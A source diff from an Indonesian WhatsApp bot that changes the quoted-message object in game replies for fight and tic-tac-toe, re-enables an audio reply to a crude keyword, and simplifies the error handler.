                     dha.sendMessage(from, salam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
                     }
@@ -5008,7 +4907,9 @@ if (budy.includes(`tolol`)) {
 if (budy.includes(`anjc`)) {
                   const ya = fs.readFileSync('media/soundnya/IhOmKasar.ogg')
                     dha.sendMessage(from, ya, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
-                    }*/
+                    }
+                    
+//dah itu doang
 
 if (fs.existsSync(`./media/${from}.json`)) {
 	gelutSkuy = setGelud(`${from}`)
@@ -5022,11 +4923,11 @@ if (fs.existsSync(`./media/${from}.json`)) {
 
 Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
 • Pemenangnya adalah [ @${winR} ] `
-	   dha.sendMessage(from, starGame, text, {quoted: ftoko, contextInfo: { mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net",]}})
+	   dha.sendMessage(from, starGame, text, {quoted: troli, contextInfo: { mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net",]}})
 		fs.unlinkSync("./media/" + from + ".json");
 	} else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
 		dha.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻
-• @${gelutSkuy.Y} Menolak🤙🏻`, text, {quoted: ftoko, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})
+• @${gelutSkuy.Y} Menolak🤙🏻`, text, {quoted: troli, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})
 		fs.unlinkSync("./media/" + from + ".json");
 	}
 }
@@ -5047,14 +4948,14 @@ Giliran = @${tty.player1.split('@')[0]}
    ${angka[1]}${angka[2]}${angka[3]}
    ${angka[4]}${angka[5]}${angka[6]}
    ${angka[7]}${angka[8]}${angka[9]}`
-  dha.sendMessage(from, ucapan, text, {quoted: ftoko, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
+  dha.sendMessage(from, ucapan, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
   }
 if (budy.startsWith('N')){
 tto = ky_ttt.filter(ghg => ghg.id.includes(from))
 tty = tto[0]
 naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
 ky_ttt = naa
-dha.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:ftoko,contextInfo:{mentionedJid:[tty.player2]}})
+dha.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:troli,contextInfo:{mentionedJid:[tty.player2]}})
 }
 }
 
@@ -5088,7 +4989,7 @@ ucapan2 = `*🎳Result Game Tictactoe 🎲*
 *Hasil Akhir:*
 
 ${ttt}`
-dha.sendMessage(from, ucapan1, text, {quoted: ftext, contextInfo:{mentionedJid: [tty.player1]}})
+dha.sendMessage(from, ucapan1, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1]}})
 naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
 return ky_ttt = naa
 }
@@ -5132,7 +5033,7 @@ Player1 @${tty.player1.split('@')[0]}=❎
 Giliran = @${tty.player2.split('@')[0]}
 
 ${ttt}`
-dha.sendMessage(from, ucapan, text, {quoted: ftext, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
+dha.sendMessage(from, ucapan, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
 }
 if (isTTT && isPlayer2){
 nuber = parseInt(budy)
@@ -5163,7 +5064,7 @@ ucapan2 = `*🎳 Game Tictactoe 🎲*
 *Hasil Akhir:*
 
 ${ttt}`
-dha.sendMessage(from, ucapan1, text, {quoted:ftext, contextInfo:{mentionedJid: [tty.player2]}})
+dha.sendMessage(from, ucapan1, text, {quoted:troli, contextInfo:{mentionedJid: [tty.player2]}})
 naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
 return ky_ttt = naa
 }
@@ -5199,7 +5100,7 @@ Player2 @${tty.player2.split('@')[0]}=❎
 Giliran = @${tty.player1.split('@')[0]}
 
 ${ttt}`
- dha.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
+ dha.sendMessage(from, ucapan, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
 } else {
 }
 if (budy.startsWith('>')){
@@ -5238,16 +5139,7 @@ console.log('[',color('TEXT','teal'),']',`Message : ${budy} From`, color(pushnam
 	} catch (e) {
     e = String(e)
     if (!e.includes("this.isZero")) {
-    if (!e.includes("Cannot read property 'conversation' of null")) {
-            if (!e.includes("Cannot read property 'contextInfo' of undefined")) {
-            if (!e.includes("Cannot set property 'mtype' of undefined")) {
-            if (!e.includes("jid is not defined")) {
-     console.log(color('|ERR|', 'red'), color(e, 'cyan'))
-     dha.sendMessage(`${owner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer P S Y C O  B O T",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/canss.jpg'),sourceUrl:"https://wa.me/6285643260438"}}})
+	console.log('Message : %s', color(e, 'green'))
+        }
 	}
-    }
-    }
-    }
-    }
-    }
-    }
+}
